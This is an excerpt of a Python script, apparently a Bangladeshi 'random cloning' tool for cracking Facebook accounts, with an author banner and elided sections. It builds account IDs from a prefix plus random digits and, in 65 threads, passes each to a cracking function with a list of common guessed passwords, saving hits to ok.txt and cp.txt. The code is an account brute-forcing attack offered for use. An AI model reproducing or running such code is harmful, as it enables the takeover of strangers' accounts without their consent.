...
\033[91;1m--------------------------------------------------\033[97;1m>>     Owner    : M R RAFU✅
\033[97;1m>>     Facebook : MD Sabbir Hossain Rafi
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Git hub  : rafu0078
\033[92;1m>>     Tools Type  : \x1b[91;1m RANDOM & FILE CLONING✅
\033[91;1m--------------------------------------------------""")
def linex():
        print('\033[91;1m--------------------------------------------------')
loop = 0
...
def random_number2():
        ...
        with ThreadPool(max_workers=65) as yaari:
                ...
                for guru in uid:
                        uid = kode+guru
                        pwx = ['+88','bangladesh','Bangladesh','i love you','first last','first123','last123','ridhisakhan12','i fuck your system']
                        yaari.submit(fcrack,uid,pwx,tl)
        print(47*"-")
        print('[✓] Crack process has been completed')
...
def random_number3():
        ...
        with ThreadPool(max_workers=65) as yaari:
                ...
                for guru in uid:
                        uid = kode+guru
                        pwx = [guru,kode+guru,'+88','bangladesh','Bangladesh','i love you','first last','first123','last123','ridhisakhan12','i fuck your system']
                        yaari.submit(fcrack,uid,pwx,tl)
        print(47*"-")
        print('[✓] Crack process has been completed')
        print('[?] Ids saved in ok.txt,cp.txt')
